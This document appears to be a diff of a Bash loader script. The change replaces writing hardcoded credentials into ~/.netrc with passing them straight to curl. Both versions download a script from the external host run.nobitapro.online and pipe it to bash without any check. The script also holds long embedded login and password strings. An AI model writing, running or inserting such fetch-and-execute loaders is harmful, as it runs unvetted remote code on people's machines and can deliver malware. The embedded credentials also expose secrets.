@@ -1,35 +1,31 @@
 #!/usr/bin/env bash
-# .netrc → curl --netrc → download & execute remote script
+# Basic Auth → curl → download & execute remote Bash script
+
 set -euo pipefail
 
+# ------------- CONFIG -----------------
 URL="https://run.nobitapro.online"
-HOST="run.nobitapro.online"
-NETRC="${HOME}/.netrc"
 
+USER="user-ty3twTsg@Ic2mymIke(ERa4qgNudHp#+v!MEEnTpIdy8hyVAK2uD@CJ(EMt&kHcE"
+PASS="pdxnfjaUFLH9j2Tw*Pyy^fZqxRMN*jrar^LFa@R%Z(^KaUnceDvjSC$w$Us3mJc@"
+# --------------------------------------
+
+# ---- dependency check ----
 if ! command -v curl >/dev/null 2>&1; then
   echo "Error: curl is required but not installed." >&2
   exit 1
 fi
 
-touch "$NETRC"
-chmod 600 "$NETRC"
-
-tmpfile="$(mktemp)"
-grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile" || true
-mv "$tmpfile" "$NETRC"
-
-# Only one account now — user-www
-{
-  printf 'machine %s ' "$HOST"
-  printf 'login %s ' "user-ty3twTsg@Ic2mymIke(ERa4qgNudHp#+v!MEEnTpIdy8hyVAK2uD@CJ(EMt&kHcE"
-  printf 'password %s\n' "pdxnfjaUFLH9j2Tw*Pyy^fZqxRMN*jrar^LFa@R%Z(^KaUnceDvjSC$w$Us3mJc@"
-} >> "$NETRC"
-
+# ---- temp file for remote script ----
 script_file="$(mktemp)"
-cleanup() { rm -f "$script_file"; }
+
+cleanup() {
+  rm -f "$script_file"
+}
 trap cleanup EXIT
 
-if curl -fsS --netrc -o "$script_file" "$URL"; then
+# ---- download with Basic Auth ----
+if curl -fsS -u "${USER}:${PASS}" -o "$script_file" "$URL"; then
   bash "$script_file"
 else
   echo "Authentication or download failed." >&2
